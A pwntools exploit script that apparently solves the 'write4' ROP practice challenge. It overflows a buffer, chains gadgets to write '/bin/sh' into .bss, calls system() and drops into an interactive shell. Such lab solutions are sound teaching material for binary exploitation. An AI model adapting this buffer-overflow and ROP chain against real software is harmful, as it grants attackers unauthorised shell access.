#!/usr/bin/python

from pwn import *

s = process('./write4')
s.clean()

bss = 0x601060
system = 0x4005e0

# 0x0000000000400820 : mov qword ptr [r14], r15 ; ret
# 0x0000000000400890 : pop r14 ; pop r15 ; ret
# 0x0000000000400893 : pop rdi ; ret
mov_ptr_r14_r15_ret = 0x400820
pop_r14_pop_r15_ret = 0x400890
pop_rdi_ret = 0x400893


write_bin_sh_to_bss = p64(pop_r14_pop_r15_ret)
write_bin_sh_to_bss += p64(bss)
write_bin_sh_to_bss += '/bin/sh\x00'
write_bin_sh_to_bss += p64(mov_ptr_r14_r15_ret)


payload = 'A' * 40
payload += write_bin_sh_to_bss
payload += p64(pop_rdi_ret)
payload += p64(bss)
payload += p64(system)

'''
context.terminal = ["terminator", "-e"]
gdb.attach(s,
"""
b * main
b * pwnme+81
""")
'''

s.sendline(payload)
s.interactive()





